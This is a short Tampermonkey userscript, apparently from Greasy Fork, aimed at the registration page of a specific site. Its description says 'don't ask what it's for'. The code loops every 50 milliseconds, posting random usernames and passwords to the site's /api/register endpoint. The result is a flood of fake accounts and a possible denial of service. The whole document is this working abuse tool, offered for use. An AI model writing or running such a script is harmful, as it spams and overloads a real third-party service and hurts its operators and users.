// ==UserScript==
// @name         请在http://galaxy.ates.top/register使用
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  请在http://galaxy.ates.top/register使用，不要问是干什么的
// @author       yangrou
// @match        http://galaxy.ates.top/register
// @icon         https://www.google.com/s2/favicons?sz=64&domain=ates.top
// @grant        none
// @license       MIT
// @downloadURL https://update.greasyfork.org/scripts/475492/%E8%AF%B7%E5%9C%A8http%3Agalaxyatestopregister%E4%BD%BF%E7%94%A8.user.js
// @updateURL https://update.greasyfork.org/scripts/475492/%E8%AF%B7%E5%9C%A8http%3Agalaxyatestopregister%E4%BD%BF%E7%94%A8.meta.js
// ==/UserScript==

(function() {
    'use strict';
function r(){
        let re='';
        for(let i=0;i<7;i++){
            re+='1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'[Math.floor(Math.random()*35)];
        }
        return re;
    }
    setInterval(function(){
    $.ajax({
    type:'POST',
    url:'/api/register',
    data: JSON.stringify({
        username:r(),
        password:r()
    }),
    contentType:'application/json',
    dataType:'json',
       success: function(data, status) {
        if (data.type === "OK") {
            console.log('ok')
        } else if (data.type === "error" && data.error === "1007") {
            console.log('error')
        }
    },
    });
    },50);
})();